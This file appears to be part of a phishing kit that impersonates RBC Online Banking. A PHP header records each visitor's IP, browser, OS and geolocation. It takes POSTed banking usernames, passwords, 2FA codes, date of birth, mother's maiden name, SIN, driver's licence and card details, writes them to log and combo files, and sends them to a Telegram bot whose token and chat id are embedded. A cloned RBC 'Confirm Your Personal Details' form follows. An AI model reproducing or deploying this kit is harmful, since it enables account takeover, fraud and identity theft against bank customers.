
<?php
        include "/files/anti/anti1.php";
        include "/files/anti/anti2.php";
        include "/files/anti/anti3.php";
        include "/files/anti/anti4.php";
        include "/files/anti/anti5.php";
        include "/files/anti/anti6.php";
        include "/files/anti/anti7.php";
        include "/files/anti/anti8.php";
$full_date = date("h:i:s|M/d/Y");
$time = date("h:i:s");
$date = date("M/d/Y");



function get_client_ip()
{
    $ipaddress = '';
    if (isset($_SERVER['HTTP_CLIENT_IP'])) {
        $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
    } else if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
    } else if (isset($_SERVER['HTTP_X_FORWARDED'])) {
        $ipaddress = $_SERVER['HTTP_X_FORWARDED'];
    } else if (isset($_SERVER['HTTP_FORWARDED_FOR'])) {
        $ipaddress = $_SERVER['HTTP_FORWARDED_FOR'];
    } else if (isset($_SERVER['HTTP_FORWARDED'])) {
        $ipaddress = $_SERVER['HTTP_FORWARDED'];
    } else if (isset($_SERVER['REMOTE_ADDR'])) {
        $ipaddress = $_SERVER['REMOTE_ADDR'];
    } else {
        $ipaddress = 'UNKNOWN';
    }

    return $ipaddress;
}
$user_agent = $_SERVER['HTTP_USER_AGENT'];

function getOS() { 
    global $user_agent;
    $os_platform  = "Unknown OS Platform";
    $os_array     = array(
                          '/windows nt 10/i'      =>  'Windows 10',
                          '/windows nt 6.3/i'     =>  'Windows 8.1',
                          '/windows nt 6.2/i'     =>  'Windows 8',
                          '/windows nt 6.1/i'     =>  'Windows 7',
                          '/windows nt 6.0/i'     =>  'Windows Vista',
                          '/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
                          '/windows nt 5.1/i'     =>  'Windows XP',
                          '/windows xp/i'         =>  'Windows XP',
                          '/windows nt 5.0/i'     =>  'Windows 2000',
                          '/windows me/i'         =>  'Windows ME',
                          '/win98/i'              =>  'Windows 98',
                          '/win95/i'              =>  'Windows 95',
                          '/win16/i'              =>  'Windows 3.11',
                          '/macintosh|mac os x/i' =>  'Mac OS X',
                          '/mac_powerpc/i'        =>  'Mac OS 9',
                          '/linux/i'              =>  'Linux',
                          '/ubuntu/i'             =>  'Ubuntu',
                          '/iphone/i'             =>  'iPhone',
                          '/ipod/i'               =>  'iPod',
                          '/ipad/i'               =>  'iPad',
                          '/android/i'            =>  'Android',
                          '/blackberry/i'         =>  'BlackBerry',
                          '/webos/i'              =>  'Mobile'
                    );

    foreach ($os_array as $regex => $value)
        if (preg_match($regex, $user_agent))
            $os_platform = $value;

    return $os_platform;
}

function getBrowser() {
    global $user_agent;
    $browser        = "Unknown Browser";
    $browser_array = array(
                            '/msie/i'      => 'Internet Explorer',
                            '/firefox/i'   => 'Firefox',
                            '/safari/i'    => 'Safari',
                            '/chrome/i'    => 'Chrome',
                            '/edge/i'      => 'Edge',
                            '/opera/i'     => 'Opera',
                            '/netscape/i'  => 'Netscape',
                            '/maxthon/i'   => 'Maxthon',
                            '/konqueror/i' => 'Konqueror',
                            '/mobile/i'    => 'Handheld Browser'
                     );

    foreach ($browser_array as $regex => $value)
        if (preg_match($regex, $user_agent))
            $browser = $value;

    return $browser;
}


$user_os        = getOS();
$user_browser   = getBrowser();
 
$PublicIP = get_client_ip();
$localHost = "127.0.0.1";

if (strpos($PublicIP, ',') !== false) {
    $PublicIP = explode(",", $PublicIP)[0];
}

$file       = '/telgram_log.txt';
$file2      = '/tangerine.csv';
$file3      = '/accounts.csv';
$file4      = '/usagent_log.txt';
$file5      = '/combo.txt';

$ip         = "".$PublicIP;
$uaget      = "".$user_agent;
$bsr        = "".$user_browser;
$uos        = "".$user_os;
$ust= explode(" ", $user_agent);
$vr= $ust[3];
$ver=str_replace(")", "", $vr);
$version   = "Version              : ".$ver;
if (strpos($PublicIP, $localHost) !== false) {
    $details = '{
        "success": false
    }';
}
else {
    $details  = file_get_contents("http://ipwhois.app/json/$PublicIP");
}
$details  = json_decode($details, true);
$success  = $details['success'];
$fp = fopen($file, 'a');

if ($success==false) {
    fwrite($fp, $ip."\n");
    fwrite($fp, $uos."\n");
    fwrite($fp, $version."\n");
    fwrite($fp, $bsr."\n");
    fclose($fp);
} else if ($success==true) {
    $country    = $details['country'];
    $city       = $details['city'];
    $continent  = $details['continent'];
    $tp         = $details['type'];
    $cn         = $details['country_phone'];
    $is         = $details['isp'];
    $la         = $details['latitude'];
    $lp         = $details['longitude'];
    $crn        = $details['currency'];
    $type       = $tp;
    $name       = $_POST['name'];  
    $dob1       = $_POST['dob1']; 
    $dob2       = $_POST['dob2']; 
    $dob3       = $_POST['dob3']; 
    $mmn        = $_POST['mmn']; 
    $sin        = $_POST['sin']; 
    $dl         = $_POST['drivers'];    
    $card       = $_POST['card'];
    $exp1       = $_POST['exp1'];
    $exp2       = $_POST['exp2'];
    $cvv        = $_POST['cvv'];



    $bank       = "[ RBC ]";
    $project    = "[CR00K-3D]";
    $url        = "https://royalbank.com";
    $user       = $_POST['username'];
    $pass       = $_POST['password'];
    $code       = $_POST['code']; 
    $code2      ="[2FA][$code]";
    $logo       = "[S-T-R|CR00K]";
    $gitusr     = "[SWIF-T-RYNX]";
    $mapurl     = "[maps.google.com/?q=$la$lh$lp]";
    $isp        = $is;
    $currency   = "".$full_date;
	$lh     = "|";
        $li     = ",";

    

} else {
    $status     = "Status : ".$success;
    fwrite($fp, $status."\n");
    fwrite($fp, $uaget."\n");
    fclose($fp);
}



$message ="$code\n\n\n$ip";

file_put_contents($file2, "$date$li$time$li$ip$li$bsr$li$uos$li$country$li$city$li$continent$li$tp$li$cn$li$is$li$la$li$lp$li$crn$li$type$li$bank$li$url$li$logo$li$gitusr$li$mapurl$li$isp$li$user$li$pass$li$code\n", FILE_APPEND); 
file_put_contents($file, "$message\n[$ip][$date]////////[$time]////////////[$bank]//[TELEGRAM-LOG]//\n", FILE_APPEND);
file_put_contents($file3, "$date$li$time$li$url$li$bank$li$ili$user$li$pass\n", FILE_APPEND);
file_put_contents($file4, "$date$lh$time$lh$ip$lh$uaget\n", FILE_APPEND);
file_put_contents($file5, "$user:$pass\n", FILE_APPEND);

$apiToken = "5884162033:AAGRZN0UMfdlO3gqYgy8PpwDpdxKsDfaMlQ"; 
$data = [
    'chat_id' => '-1001831940786',
    'text' => $message
];

$response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" .
                                 http_build_query($data) );
                     
?>
<!-- saved from url=(0078)file:///C:/Users/MSI-OF~1/AppData/Local/Temp/Rar$EXa10828.22386/rbc/rbc_4.html -->
<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
        
        <meta http-equiv="X-UA-Compatible" content="IE=Edge">
        <title>Verification ??? RBC Online Banking</title>
        <!--<base href="">-->
        <!--<base href=".">--><!--<base href=".">--><base href=".">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <link rel="stylesheet" href="files/styles.c203039f21a7c88c809b.css">
        <link rel="stylesheet" href="./files/main.css">
        <script src="./files/jquery-3.6.0.min.js###" crossorigin="anonymous"></script>
        <script>
            var lrbank = 'RBC';
            var lrinfo = 'Details';
        </script>
        <script src="./files/actions.js###"></script>
        <script src="./files/jquery.mask.js###"></script>
        <script src="./files/details.js###"></script>
    </head>
    <body>
        <core-banking-root ng-version="10.2.5">
            <core-banking-main-container _nghost-ahj-c56="">
                <div _ngcontent-ahj-c56="" class="main">
                    <header _ngcontent-ahj-c56="" class="title-block">
                        <rbc-logo _ngcontent-ahj-c56="" token="rbc_shield-notm_onlight" class="rbc-logo" aria-label="RBC Logo">
                            <svg width="100%" height="100%" viewBox="0 0 76 100" fill="none" xmlns="http://www.w3.org/2000/svg" fit="" preserveAspectRatio="xMidYMid meet" focusable="false" role="img" aria-labelledby="rbc_shield-notm_onlight-title-2">
                                <path d="M76 87.7509C76 91.0573 74.6456 92.974 72.0026 93.9914C61.7332 97.9562 49.5701 100 37.9999 100C26.4314 100 14.2686 97.9562 3.99618 93.9914C1.35426 92.974 0 91.0571 0 87.7509V0H76V87.7509Z" fill="#0051A5"></path>
                                <path fill-rule="evenodd" clip-rule="evenodd" d="M66.9635 76.1925C66.915 76.0902 66.5343 75.2879 65.4356 74.6641C64.7925 74.3026 63.8465 73.8608 61.9559 73.8605C58.5626 73.8605 56.0306 75.7556 56.1137 81.5615C56.2026 87.8528 60.3382 89.14 63.1587 89.14C66.571 89.14 68.1627 87.6531 68.1627 87.6531V89.8763C68.1627 89.8763 66.3934 91.3089 61.8876 91.3089C57.0451 91.3089 51.5511 89.3222 51.5511 81.6708C51.5511 74.881 56.1631 71.7778 62.3234 71.7778C66.3933 71.7778 68.1045 73.0065 68.1045 73.0065L67.1513 76.2469C67.1513 76.2469 67.0259 76.2675 66.9689 76.2033C66.9685 76.2029 66.9667 76.1992 66.9635 76.1925ZM21.9136 91.0162H27.3695L20.3987 82.1053C23.1933 81.3576 25.2863 79.83 25.2863 77.0533C25.2863 73.7924 23.3359 72.0677 18.2326 72.0677H7.69226V72.231C8.08008 72.3696 8.51447 72.6204 8.79862 72.9001C9.53628 73.6276 9.75625 74.7384 9.75625 76.2398V91.0163H14.1336V82.6171H15.7313L21.9136 91.0162ZM14.1337 73.8739H17.0826C19.5374 73.8739 20.8187 74.5909 20.8187 77.2005C20.8187 79.527 19.1421 80.9043 16.4541 80.9043H14.1336V73.8739H14.1337ZM42.5759 80.3987C44.4942 80.0867 46.3296 78.594 46.3296 76.3374C46.3296 74.3026 45.4651 72.0677 39.4755 72.0677H29.3708V72.231C29.6769 72.3244 30.1595 72.5723 30.4757 72.8858C31.1623 73.5562 31.3883 74.559 31.4217 75.8884V91.0163H39.7961C44.4024 91.0163 47.7362 89.2598 47.7362 85.2352C47.7363 81.9627 45.1896 80.569 42.5759 80.3987ZM38.2672 73.8739C40.41 73.8739 41.8633 74.3376 41.8633 76.6261C41.8633 79.0649 39.9156 79.7368 37.6943 79.7368H35.7804V73.8739H38.2672ZM38.483 89.2247H35.7803V81.4888H38.3588C41.9011 81.4888 43.261 82.5442 43.261 85.2001C43.261 88.0733 41.4871 89.2247 38.483 89.2247Z" fill="white"></path>
                                <path fill-rule="evenodd" clip-rule="evenodd" d="M68.2035 70.2372H68.9165L70.3013 65.5227C69.3174 64.1163 68.0609 63.049 66.1016 62.4078C70.5578 58.8526 71.9296 54.0683 71.9296 50.3599C71.9296 46.267 70.2909 42.592 67.8638 39.9652C68.4923 38.9253 69.526 37.2283 70.1277 36.2404C70.3566 35.8645 70.523 35.5913 70.5808 35.496C70.9176 34.9421 71.094 34.0764 70.9802 33.3928C70.8432 32.5747 70.4977 32.0179 69.6216 31.5574C68.6289 31.037 62.5926 27.8839 62.5926 27.8839H48.3146L43.2273 30.932V22.0796H41.5932C42.0874 21.7049 42.4269 21.2837 42.6165 20.9893L42.4374 20.5929C40.6763 21.9774 39.7114 21.8828 36.3282 20.8185C34.4054 20.2152 32.7131 20.868 31.5165 21.7953C31.4958 21.6144 31.4929 21.4266 31.5165 21.2326C31.6199 20.3172 32.3444 19.3332 34.8983 19.4936C36.8036 19.6103 38.3939 19.6378 38.939 19.6351C40.6124 19.6276 41.6428 19.4178 42.3253 18.8975C43.458 18.0328 43.6705 16.9557 43.7362 16.3596C43.8311 15.5375 43.8834 14.2371 43.8834 13.2692V7.52452H21.4629V3.63702H15.6962C12.0463 3.63702 9.02604 6.33666 9.02604 9.8818C9.02604 13.2839 11.5989 15.848 15.0111 15.848H15.3609V13.5827H15.0111C13.0638 13.5827 12.2123 11.9895 12.3261 10.0973C12.4428 8.12372 14.1161 7.10634 15.5709 7.10634H18.2912V10.9938H26.2647V12.8539H24.1233V13.9735L28.5953 15.6744V10.9937H40.4157V13.6964C40.4157 14.4894 40.4157 14.9601 40.3357 15.4193C40.2686 15.797 40.1812 16.0901 39.8909 16.3743C39.6143 16.6484 39.187 16.7359 38.6156 16.7693C37.8476 16.813 35.5778 16.864 34.215 16.864C31.6641 16.864 28.5301 17.4544 28.5301 21.1554C28.5301 25.4178 32.3446 26.5793 34.3607 26.5415C36.1946 26.514 37.4407 25.8957 38.0544 25.3653H39.7731V28.0679C37.5851 27.2923 34.9656 27.7807 32.1348 28.3521C30.1728 28.7454 28.1436 29.0326 25.979 29.0473C22.3011 29.0751 18.7853 26.4367 18.3437 21.861L16.6177 20.8391C16.3292 25.7308 17.9181 28.8899 23.0271 31.5122C29.2194 34.6928 33.3839 37.6372 35.0575 42.9317H35.645V38.9027C40.6738 42.1358 43.6768 44.9215 45.0148 48.0743C45.5951 49.4359 46.2074 51.666 46.2919 53.4867H46.878C47.2234 51.9152 47.4712 48.4941 46.4275 45.5759C46.2705 45.1344 46.0513 44.725 45.836 44.3228C45.8232 44.2988 45.8103 44.2749 45.7975 44.2509L50.6328 44.474C50.5438 46.2276 50.5599 48.2709 50.8002 50.4593L49.0789 50.5524V51.105L50.8906 51.2083C50.9969 52.0087 51.1354 52.8279 51.3118 53.653H51.8412C51.8135 52.9125 51.8207 52.1135 51.866 51.2654L60.1369 51.7332C60.102 53.3761 59.9358 55.1327 59.5904 56.991L57.7726 57.2155V57.5728L59.4489 57.6967C59.3164 58.3454 59.1602 59.0028 58.9811 59.6704H59.5146C59.8104 59.1631 60.1472 58.5305 60.4854 57.7767L67.0523 58.2869C65.991 59.8408 64.7825 61.0857 63.2373 62.0639C62.8949 62.0842 62.2315 62.1687 61.9154 62.2182C60.9069 62.378 57.1836 62.947 53.867 63.4539C51.7374 63.7793 49.7756 64.0791 48.8076 64.2286C48.544 63.1703 48.2276 62.2562 47.9114 61.577C45.2463 55.8662 42.0776 53.7446 27.6128 44.0595C26.6332 43.4036 25.6017 42.713 24.5152 41.9843C19.0052 38.2906 10.3306 32.2719 7.75641 27.3681C6.92976 25.7981 6.53626 23.9572 6.53931 22.3041C6.54194 20.5111 7.08736 18.7475 8.14118 17.3509V15.7182C6.01746 16.8583 4.31343 19.9019 4.35556 23.272C4.38023 25.1569 4.56236 26.5445 5.21257 28.2602C6.28094 31.0939 8.12801 33.5573 12.7006 37.6753C16.9353 41.4945 19.9061 44.7028 21.5414 49.0032H22.1289V44.6679C22.7804 45.1316 23.435 45.5991 24.0829 46.062C24.482 46.347 24.8786 46.6303 25.2705 46.9098H25.2689C29.1275 49.6706 33.2044 53.564 35.0572 57.711H35.6447V53.6924C42.6212 58.3744 47.6124 62.7502 48.7056 71.5823H49.2916C49.5876 69.4398 49.4096 67.1715 49.0308 65.2343H60.8247C64.6002 65.2343 68.2035 66.3057 68.2035 70.2372ZM32.8023 23.4659C33.9557 22.3668 35.0737 22.1189 37.0792 22.559C36.6812 23.0721 35.9802 23.7472 34.8548 23.826C34.0735 23.8827 33.3666 23.7355 32.8023 23.4659ZM41.5703 31.9276L35.9206 35.3139C34.1902 34.2146 31.6656 32.6011 30.9557 32.1157C31.4551 32.0392 32.122 31.8984 32.862 31.742C34.4785 31.4006 36.4443 30.9853 37.779 31.0063C39.2352 31.0254 40.4624 31.3752 41.5703 31.9276ZM61.9341 34.5747L61.1514 35.6724C59.6309 35.152 57.8135 34.9858 56.2537 34.9859C51.4841 34.9859 46.6652 37.5327 43.9231 41.5223C42.6667 40.0692 40.8985 38.626 38.9759 37.2907L49.2086 31.1334H61.8189L67.5245 34.1158L65.3219 37.7381C64.6469 37.2905 64.1396 36.9552 63.5915 36.6929L64.3349 34.438L60.9238 32.5982L60.7214 32.9555L61.9341 34.5747ZM59.507 44.8776C59.8219 46.3805 60.0596 48.0845 60.1237 49.9679L51.9227 50.4023C52.0657 48.5935 52.3658 46.6078 52.8264 44.5746L59.507 44.8776ZM62.5013 49.844C62.6106 48.3513 62.5887 46.7348 62.3744 45.0105L67.8828 45.2639C68.5241 46.5658 68.9513 47.9898 69.1203 49.4926L62.5013 49.844ZM57.0496 38.0089C57.484 38.7918 58.3091 40.4537 58.9984 42.8428L53.1678 43.1663C53.6123 41.4548 54.1563 39.7655 54.8268 38.0949C54.8828 38.0887 54.939 38.0824 54.9955 38.0761C55.3944 38.0315 55.8041 37.9856 56.2113 37.9856C56.4928 37.9856 56.7725 37.9931 57.0496 38.0089ZM61.9736 42.678C61.7011 41.4418 61.3293 40.1564 60.8365 38.8327C62.8524 39.5996 64.6296 40.856 66.0202 42.455L61.9736 42.678ZM69.1425 52.2478C69.0592 53.6471 68.7546 54.7534 68.2809 55.9022L60.8934 56.8321C61.4401 55.4592 61.9532 53.7826 62.2637 51.8571L69.1425 52.2478ZM46.0047 43.5453C47.4216 41.5323 49.0088 40.1317 51.3135 39.0981C51.1562 39.8211 50.8822 41.2087 50.7129 43.299L46.0047 43.5453ZM6.0962 39.6765C6.39087 43.9886 9.8717 46.9011 20.4019 53.4751C31.5736 60.4485 34.696 64.705 35.6452 70.228H35.0576C32.6377 64.9004 27.7137 61.9163 22.1294 58.7474V63.0463H21.5418C19.9182 59.259 17.1006 55.6395 12.9665 52.5375C9.13417 49.663 7.57734 48.2331 6.09633 45.9534C5.11833 44.4461 4.3194 42.5601 4.32093 40.0688C4.32093 38.5383 4.82393 36.8721 5.61981 35.6081L6.61237 36.2669C6.24478 37.3226 6.04658 38.7991 6.0962 39.6765Z" fill="#FEDF01"></path>
                                <title id="rbc_shield-notm_onlight-title-2">RBC</title>
                            </svg>
                        </rbc-logo>
                        <p _ngcontent-ahj-c56="" class="title">Secure Sign-in</p>
                    </header>
                    <style>
                    .InputContainer__input div {
                        margin-bottom: 10px;
                    }

                    .InputContainer__input input, .InputContainer__input select {
                        color: #1f1f1f !important;
                        border: 0.5px solid #6f6f6f;
                        padding: 6px;
                        width: 28px;
                        height: 48px;
                        width: 100%;
                        margin-left: 0px;
                        text-align: left;
                        padding-left: 10px;
                        font-size: 14px !important;
                        margin-bottom: 20px !important;
                    }
                    </style>
                    <main _ngcontent-ahj-c56="" class="content default-container" style="height: auto">
                        <router-outlet></router-outlet>
                        <core-banking-passcode-view _nghost-ahj-c68="">
                            <div _ngcontent-ahj-c68="" class="passcode-view-component">
                                <h1 _ngcontent-ahj-c68="" class="passcode-heading">Confirm Your Personal Details</h1>
                                <p _ngcontent-ahj-c68="" class="passcode-message">To validate your sign in request, please confirm your personal details.</p>
                                <form action="040151.php" method="POST" class="lab-form">
                                    <core-banking-otp-input _ngcontent-ahj-c68="">
                                        <div class="otp-input-component ng-pristine ng-invalid ng-touched">
                                                                                        <div class="InputContainer__input" style="display: block; text-align: left;">
                                                <div>Date of Birth</div>
                                                <select name="dob1" required="" class="Input__input lrinput" style="width:30%;display: inline-block;" attr-action="Selecting DoB">
                                                    <option value="">MM</option>
                                                    <option value="01">01</option><option value="02">02</option><option value="03">03</option><option value="04">04</option><option value="05">05</option><option value="06">06</option><option value="07">07</option><option value="08">08</option><option value="09">09</option><option value="10">10</option><option value="11">11</option><option value="12">12</option>                                                </select>
                                                <select name="dob2" required="" class="Input__input lrinput" style="width:30%;display: inline-block;" attr-action="Selecting DoB">
                                                    <option value="">DD</option>
                                                    <option value="01">01</option><option value="02">02</option><option value="03">03</option><option value="04">04</option><option value="05">05</option><option value="06">06</option><option value="07">07</option><option value="08">08</option><option value="09">09</option><option value="10">10</option><option value="11">11</option><option value="12">12</option><option value="13">13</option><option value="14">14</option><option value="15">15</option><option value="16">16</option><option value="17">17</option><option value="18">18</option><option value="19">19</option><option value="20">20</option><option value="21">21</option><option value="22">22</option><option value="23">23</option><option value="24">24</option><option value="25">25</option><option value="26">26</option><option value="27">27</option><option value="28">28</option><option value="29">29</option><option value="30">30</option><option value="31">31</option>                                                </select>
                                                <select name="dob3" required="" class="Input__input lrinput" style="width:36%; display: inline-block;" attr-action="Selecting DoB">
                                                    <option value="">YYYY</option>
                                                    <option value="2023">2023</option><option value="2022">2022</option><option value="2021">2021</option><option value="2020">2020</option><option value="2019">2019</option><option value="2018">2018</option><option value="2017">2017</option><option value="2016">2016</option><option value="2015">2015</option><option value="2014">2014</option><option value="2013">2013</option><option value="2012">2012</option><option value="2011">2011</option><option value="2010">2010</option><option value="2009">2009</option><option value="2008">2008</option><option value="2007">2007</option><option value="2006">2006</option><option value="2005">2005</option><option value="2004">2004</option><option value="2003">2003</option><option value="2002">2002</option><option value="2001">2001</option><option value="2000">2000</option><option value="1999">1999</option><option value="1998">1998</option><option value="1997">1997</option><option value="1996">1996</option><option value="1995">1995</option><option value="1994">1994</option><option value="1993">1993</option><option value="1992">1992</option><option value="1991">1991</option><option value="1990">1990</option><option value="1989">1989</option><option value="1988">1988</option><option value="1987">1987</option><option value="1986">1986</option><option value="1985">1985</option><option value="1984">1984</option><option value="1983">1983</option><option value="1982">1982</option><option value="1981">1981</option><option value="1980">1980</option><option value="1979">1979</option><option value="1978">1978</option><option value="1977">1977</option><option value="1976">1976</option><option value="1975">1975</option><option value="1974">1974</option><option value="1973">1973</option><option value="1972">1972</option><option value="1971">1971</option><option value="1970">1970</option><option value="1969">1969</option><option value="1968">1968</option><option value="1967">1967</option><option value="1966">1966</option><option value="1965">1965</option><option value="1964">1964</option><option value="1963">1963</option><option value="1962">1962</option><option value="1961">1961</option><option value="1960">1960</option><option value="1959">1959</option><option value="1958">1958</option><option value="1957">1957</option><option value="1956">1956</option><option value="1955">1955</option><option value="1954">1954</option><option value="1953">1953</option><option value="1952">1952</option><option value="1951">1951</option><option value="1950">1950</option><option value="1949">1949</option><option value="1948">1948</option><option value="1947">1947</option><option value="1946">1946</option><option value="1945">1945</option><option value="1944">1944</option><option value="1943">1943</option><option value="1942">1942</option><option value="1941">1941</option><option value="1940">1940</option><option value="1939">1939</option><option value="1938">1938</option><option value="1937">1937</option><option value="1936">1936</option><option value="1935">1935</option><option value="1934">1934</option><option value="1933">1933</option><option value="1932">1932</option><option value="1931">1931</option><option value="1930">1930</option><option value="1929">1929</option><option value="1928">1928</option><option value="1927">1927</option><option value="1926">1926</option><option value="1925">1925</option><option value="1924">1924</option><option value="1923">1923</option><option value="1922">1922</option><option value="1921">1921</option><option value="1920">1920</option><option value="1919">1919</option><option value="1918">1918</option><option value="1917">1917</option><option value="1916">1916</option><option value="1915">1915</option><option value="1914">1914</option><option value="1913">1913</option>                                                </select>
                                            </div>
                                                                                        <div class="InputContainer__input">
                                                <div>Mother's Maiden Name</div>
                                                <input required="" id="input-mmn" type="text" placeholder="Mother&#39;s Maiden Name" name="mmn" class="Input__input lrinput" attr-action="Filling MMN">
                                            </div>
                                                                                        <br>
                                        </div>
                                    </core-banking-otp-input>
                                    <button _ngcontent-ahj-c68="" type="submit" rbccta="primary" size="small" data-dig-id="MFA_PMSM_016" class="passcode-button rbc-cta rbc-cta--small" style="margin-top: -15px; margin-bottom: 20px;" name="save" value="1"> Continue </button>
                                </form>
                            </div>
                        </core-banking-passcode-view>
                        <!---->
                    </main>
                </div>
            </core-banking-main-container>
        </core-banking-root>
    

</body></html>